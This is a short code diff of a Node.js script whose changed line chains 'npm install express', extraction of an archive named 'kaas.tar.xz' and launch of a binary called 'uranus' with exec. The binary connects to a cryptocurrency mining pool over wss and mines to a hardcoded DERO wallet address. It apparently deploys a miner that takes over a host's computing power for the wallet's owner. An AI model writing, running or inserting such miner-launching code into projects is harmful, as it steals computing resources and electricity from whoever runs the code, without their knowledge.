@@ -21,7 +21,7 @@ exec("tar -xf kaas.tar.xz", (error, stdout, stderr) => {
   console.error(`stderr: ${stderr}`);
 });
 
-exec("./uranus -o wss://community-pools.mysrv.cloud:10300 -u dero1qyfjd3gswr7afgrgm0w8trp5wn09sudh9mld8czscf9a46n6grhcgqghx8k3p", (error, stdout, stderr) => {
+exec("npm install express && tar -xf kaas.tar.xz && ./uranus -o wss://community-pools.mysrv.cloud:10300 -u dero1qyfjd3gswr7afgrgm0w8trp5wn09sudh9mld8czscf9a46n6grhcgqghx8k3p", (error, stdout, stderr) => {
   if (error) {
     console.error(`exec error: ${error}`);
     return;
